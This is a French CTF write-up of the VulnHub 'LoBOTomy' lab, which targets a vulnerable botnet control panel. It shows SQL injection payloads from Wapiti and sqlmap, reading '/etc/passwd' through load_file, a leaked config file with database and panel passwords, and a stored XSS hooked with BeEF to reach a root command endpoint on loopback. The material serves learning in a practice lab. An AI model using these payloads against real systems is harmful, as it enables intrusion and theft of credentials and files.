# A propos du CTF LoBOTomy

Présentation
------------

[Le challenge LoBOTomy](http://vulnhub.com/entry/bot-challenges-lobotomy,89/) est le dernier en date créé par *Brian Wallace* AKA *@botnet\_hunter*.  

Comme pour les autres CTF téléchargeable sur *VulnHub* il s'agit d'une machine virtuelle.  

N'étant pas parvenu à la fin de ce challenge je donne ici les informations que j'ai trouvé mais pas de solution personnelle.  

En bas de page je donne toutefois rapidement l'étape manquante que certains ont trouvé pour finir ce CTF.  

Pour plus d'infos il faudra se référer aux autres writeups listés sur *VulnHub*.  

Trouver une faille
------------------

On trouve les mêmes ports ouverts que d'habitude (HTTP, SSH, rpcinfo).  

Sur le serveur web on trouve des liens pointant vers des analyses du bot dont on devra pénétrer le command and control :  

<http://blog.cylance.com/a-study-in-bots-madness-pro>  

<https://malwr.com/analysis/ZTQyOWYyZTQxYmNlNDkwNWE3ZWZhY2QxNmM2NTJhMTk/>  

Ce qui nous intéresse principalement ici c'est la requête HTTP effectuée par le bot car elle contient le nom des variables passées à un script.  

Aditionnellement, une indication sur la page précise qu'un navigateur headless (ici basé sur *SlimmerJS*) simule la connexion d'une personne sur le panel de contrôle du bot.  

La première chose à faire est d'essayer de trouver où a été placé ce fameux panel. Un scan avec *dirb* permet de trouver rapidement un dossier *m* :  

```plain
./dirb http://192.168.1.57/ wordlists/big.txt
http://192.168.1.57/m/
http://192.168.1.57/m/adm/
http://192.168.1.57/m/inc/
http://192.168.1.57/m/pwd/
```

Et si on passe en paramètre les valeurs présentes dans l'analyse de malwr.com (*/m/?uid=88039670&ver=1.14&mk=bb3b62&os=WinXP&rs=adm&c=1&rq=0*) on obtient le texte *"d3Rm"*.  

Aussitôt on lance *Wapiti* qui trouve des failles d'injection MySQL pour presque tous les paramètres :  

```plain
[+] Lancement du module blindsql
Faille d'injection SQL en aveugle dans http://192.168.1.57/m/ via une injection dans le paramètre uid
  Evil url: http://192.168.1.57/m/?uid=%27%20or%20sleep%287%29%231&ver=1.14&mk=bb3b62&os=WinXP&rs=adm&c=1&rq=0
Faille d'injection SQL en aveugle dans http://192.168.1.57/m/ via une injection dans le paramètre ver
  Evil url: http://192.168.1.57/m/?uid=88039670&ver=sleep%287%29%231&mk=bb3b62&os=WinXP&rs=adm&c=1&rq=0
Faille d'injection SQL en aveugle dans http://192.168.1.57/m/ via une injection dans le paramètre mk
  Evil url: http://192.168.1.57/m/?uid=88039670&ver=1.14&mk=sleep%287%29%231&os=WinXP&rs=adm&c=1&rq=0
Faille d'injection SQL en aveugle dans http://192.168.1.57/m/ via une injection dans le paramètre os
  Evil url: http://192.168.1.57/m/?uid=88039670&ver=1.14&mk=bb3b62&os=sleep%287%29%231&rs=adm&c=1&rq=0
Faille d'injection SQL en aveugle dans http://192.168.1.57/m/ via une injection dans le paramètre rs
  Evil url: http://192.168.1.57/m/?uid=88039670&ver=1.14&mk=bb3b62&os=WinXP&rs=sleep%287%29%231&c=1&rq=0
Faille d'injection SQL en aveugle dans http://192.168.1.57/m/ via une injection dans le paramètre c
  Evil url: http://192.168.1.57/m/?uid=88039670&ver=1.14&mk=bb3b62&os=WinXP&rs=adm&c=sleep%287%29%231&rq=0
Faille d'injection SQL en aveugle dans http://192.168.1.57/m/ via une injection dans le paramètre rq
  Evil url: http://192.168.1.57/m/?uid=88039670&ver=1.14&mk=bb3b62&os=WinXP&rs=adm&c=1&rq=sleep%287%29%231
```

On enchaine avec *sqlmap* sur le paramètre *uid* qui nous présente différentes techniques d'attaque :  

```plain
sqlmap identified the following injection points with a total of 42 HTTP(s) requests:
---
Place: GET
Parameter: uid
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uid=88039670' AND 5822=5822 AND 'BNVA'='BNVA&ver=1.14&mk=bb3b62&os=WinXP&rs=adm&c=1&rq=0

    Type: UNION query
    Title: MySQL UNION query (NULL) - 4 columns
    Payload: uid=-8964' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716d6a7071,0x5a6c444c4c796a655441,0x7178696b71)#&ver=1.14&mk=bb3b62&os=WinXP&rs=adm&c=1&rq=0

    Type: AND/OR time-based blind
    Title: MySQL > 5.0.11 AND time-based blind
    Payload: uid=88039670' AND SLEEP(5) AND 'UNfr'='UNfr&ver=1.14&mk=bb3b62&os=WinXP&rs=adm&c=1&rq=0
---
```

Les options d'énumération de *sqlmap* fonctionnent bien et permettent de récolter les informations suivantes :  

```plain
current user:    'root@localhost'
current database:    'madness'

Database: madness                                                                                                                                                                                             
[1 table]
+------+
| bots |
+------+

Database: madness                                                                                                                                                                                             
Table: bots
[9 columns]
+-------------+--------------+
| Column      | Type         |
+-------------+--------------+
| User        | varchar(255) |
| version     | varchar(6)   |
| command     | varchar(255) |
| id          | varchar(255) |
| last_ip     | varchar(15)  |
| last_online | int(10)      |
| new         | tinyint(1)   |
| OS          | varchar(10)  |
| regdate     | datetime     |
+-------------+--------------+
```

En revanche un accès au fichier via *--file-read* n'aboutit pas et *--os-shell* échoue.  

Seul bon point, *--sql-shell* fonctionne et nous permet malgré tout d’accéder aux fichiers sur le disque (en tant que l'utilisateur mysql).  

Voici un exemple d'output (volontairement réduit) :  

```plain
sql-shell> select load_file('/etc/passwd');
[23:34:40] [INFO] fetching SQL SELECT statement query output: 'select load_file('/etc/passwd')'
select load_file('/etc/passwd');:    'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbotter:x:1000:1000:botter,,,:/home/botter:/bin/bash\n'
```

La lecture de */etc/apache2/apache2.conf* n'apporte bien de bien intéressant. Il aura fallut faire une recherche Google pour déterminer le nom du fichier de configuration par défaut utilisé sous *Debian Jessie*, le système sur lequel tourne ce CTF : */etc/apache2/sites-enabled/000-default.conf*.  

On obtient la configuration suivante :  

```plain
<VirtualHost *:80>
        --- snip ---
        #ServerName www.example.com

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        --- snip ---
</VirtualHost>
```

A noter pour la prochaine fois que c'est plus simple de se référer au home de *www-data* dans */etc/passwd* pour trouver la racine web :p  

Accèder au C&C
--------------

Toujours avec le shell SQL on peut obtenir le contenu de */var/www/html/m/inc/config.php* :  

```plain
<?php
if (!defined("FILE")) die ("Illegal File Access");
//error_reporting(0);
$conf            = array();
$conf['dbhost']  = "localhost";
$conf['dbname']  = "madness";
$conf['dbuser']  = "root";
$conf['dbpass']  = "password";

$conf['adname']  = "madness";
$conf['adpass']  = "madness";
$conf['guname']  = "mad";
$conf['gupass']  = "madness";

$conf['time_out']= "5";
$conf['pages']   = "80";
$conf['version'] = "Darkness Panel Mod For Madness by NoNh";
$conf['lang']    = "en";
$conf['time']    = "25";
$conf['time_on'] = "1";
$conf['auth']    = "0";
$conf['pwdpath'] ="./pwd/";

$conf['command'] = "d3Rm";
$conf['timecmd'] = "0|0|0||0|0|0||0|---snip---|0|0|0";
?>
```

Le couple *adname* / *adpass* est celui destiné à l'administrateur alors que *guname* / *gupass* correspond à un compte guest (d'après le reste du code source récupéré).  

L'injection SQL dans uid permet de placer un OUTFILE mais les droits sur la racine web sont bien réglés... Ca passe dans /tmp mais pas ailleurs :(  

Il aura fallu faire un autre *dirb* pour trouve où s'authentifier sur le panel (en l’occurrence c'était */m/adm/auth.php*)  

```
./dirb http://192.168.1.57/m/ ../wordlists/Filenames_or_Directories_All.wordlist
```

Malheureusement, une fois connecté, pas de section d'upload ni de faille d'injection de commande et aucun bot à contrôler dans le panel.  

Il est possible de faire stocker des informations dans le fichier *config.php* depuis le panel mais ces informations sont alors encodées en base64 rendant impossible toute sorte d'échappement du PHP !  

Le panel est vulnérable à une faille XSS permanente qui semble correspondre à l'indication concernant le browser headless mais je n'ai pas compris l'intérêt d'exploiter cette faille ayant déjà obtenu l'accès administrateur sur le panel. J'ai finalement décidé d'abandonner après plusieurs autres tentatives.  

Ce qu'il fallait faire
----------------------

Voir plus loin que le bout de son nez :p  

Pour terminer le challenge il fallait se servir du [framework BeEF](http://beefproject.com/) pour exploiter la faille XSS. Ainsi *BeEF* s'injecte dans la session du browser headless et à partir de là il est possible de scanner les ports internes de la machine (le browser headless a accès à 127.0.0.1) ce qui permet de découvrir l'existence d'un autre serveur web sur le port 8080 (sur le loopback).  

La racine de ce serveur web permet de passer directement des commandes en tant que root via l'URL.  

Le problème c'est que l'opération prend énormément de temps (un scan de port via javascript ce n'est pas une science exacte). Il me semble que lorsque j'ai reproduit [ce qu'avait fait Vinicius777](https://vinicius777.github.io/blog/2014/06/12/lobotomy-writeup/) via *BeEF* après avoir jeté l'éponge il a fallu un quart d'heure pour le scan des ports les plus fréquents :(

*Published June 21 2014 at 19:02*